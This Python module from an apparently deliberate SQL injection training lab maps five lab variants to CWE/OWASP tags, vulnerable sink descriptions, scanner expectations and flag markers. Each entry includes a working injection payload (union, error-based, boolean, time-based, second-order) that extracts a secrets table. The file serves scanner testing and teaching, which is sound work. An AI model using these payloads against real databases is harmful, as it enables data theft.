"""Per-lab detection hints for SQLi labs.

Exposed via /meta/<slug> on sqli.vulnlab.dev.
"""
from __future__ import annotations

CWE_SQLI = "CWE-89"
OWASP_2021 = "A03:2021 — Injection (SQLi)"

DETECT_HINTS: dict[str, dict] = {
    "union": {
        "cwe": CWE_SQLI,
        "owasp": OWASP_2021,
        "subtype": "in-band-union-based",
        "sinks": ["f-string concatenation in SELECT WHERE"],
        "exploit_examples": [
            "/union/?category=widgets'+UNION+SELECT+name,value,0+FROM+secrets--+",
        ],
        "success_markers": ["VULNLAB{sqli-union-based-extraction}"],
        "tags": ["union-select", "in-band", "3-column"],
        "scanner_should_fire": True,
    },
    "error": {
        "cwe": CWE_SQLI,
        "owasp": OWASP_2021,
        "subtype": "error-based",
        "sinks": ["f-string concatenation + raw exception render"],
        "exploit_examples": [
            "POST /error/ username=' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT value FROM secrets WHERE name='sqli-error')))-- ",
        ],
        "success_markers": ["VULNLAB{sqli-error-based-extraction}"],
        "tags": ["error-based", "extractvalue", "verbose-errors"],
        "scanner_should_fire": True,
    },
    "blind-bool": {
        "cwe": CWE_SQLI,
        "owasp": OWASP_2021,
        "subtype": "blind-boolean",
        "sinks": ["f-string concatenation in WHERE id=<input>"],
        "exploit_examples": [
            "/blind-bool/?id=1+AND+SUBSTRING((SELECT+value+FROM+secrets+WHERE+name='sqli-blind-bool'),1,1)='V'",
        ],
        "success_markers": ["VULNLAB{sqli-blind-boolean-oracle}"],
        "tags": ["blind", "boolean-oracle", "no-error-leak"],
        "scanner_should_fire": True,
    },
    "blind-time": {
        "cwe": CWE_SQLI,
        "owasp": OWASP_2021,
        "subtype": "blind-time-based",
        "sinks": ["f-string concatenation; response shape independent of result"],
        "exploit_examples": [
            "/blind-time/?username=nonexistent'+UNION+SELECT+IF(SUBSTRING((SELECT+value+FROM+secrets+WHERE+name='sqli-blind-time'),1,1)='V',SLEEP(2),'x')--+",
        ],
        "success_markers": ["VULNLAB{sqli-blind-time-based-oracle}"],
        "tags": ["blind", "time-based", "sleep"],
        "scanner_should_fire": True,
        "notes": "Only signal is request latency. Scanners without a timing oracle will miss this.",
    },
    "second-order": {
        "cwe": CWE_SQLI,
        "owasp": OWASP_2021,
        "subtype": "second-order-stored-input",
        "sinks": [
            "INSERT (parameterized, safe) -> later SELECT with string concatenation against stored value",
        ],
        "exploit_examples": [
            # Use # rather than `-- ` because the register handler strips
            # trailing whitespace from the form value; MariaDB's -- comment
            # requires a trailing space, # does not.
            "POST /second-order/register username=' UNION SELECT value FROM secrets WHERE name='sqli-second-order'#",
            "GET /second-order/profile?id=<new-user-id>",
        ],
        "success_markers": ["VULNLAB{sqli-second-order-via-stored-input}"],
        "tags": ["second-order", "stored", "cross-sink"],
        "scanner_should_fire": True,
        "notes": (
            "Single-sink taint trackers that clear the INSERT (because it's "
            "parameterized) miss this. Needs cross-sink data-flow modeling: "
            "user input flows through the DB and back into a second, "
            "unsafely-constructed query."
        ),
    },
}
